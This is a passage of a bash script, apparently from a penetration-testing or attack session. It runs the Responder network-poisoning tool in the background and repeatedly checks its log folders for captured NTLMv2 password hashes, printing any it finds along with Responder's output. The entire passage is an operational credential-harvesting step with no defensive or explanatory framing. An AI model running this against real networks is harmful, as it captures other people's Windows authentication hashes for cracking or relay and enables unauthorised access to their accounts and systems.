RESPONDER_PID=$!
echo "Responder PID: $RESPONDER_PID"
# Wait up to 120 seconds watching for NTLMv2 hashes
for i in $(seq 1 24); do
  sleep 5
  if [ -d /usr/share/responder/logs ] && ls /usr/share/responder/logs/*NTLM* 2>/dev/null; then
    echo "=== HASH FOUND ==="
    cat /usr/share/responder/logs/*NTLM* 2>/dev/null
    break
  fi
  # Also check responder's default log locations
  if [ -d /opt/responder/logs ] && ls /opt/responder/logs/*NTLM* 2>/dev/null; then
    echo "=== HASH FOUND ==="
    cat /opt/responder/logs/*NTLM* 2>/dev/null
    break
  fi
  echo "Check $i/24 ($(($i * 5))s) - no hash yet"
done
echo "=== Responder output ==="
cat /tmp/responder_out.txt 2>/dev/null || true
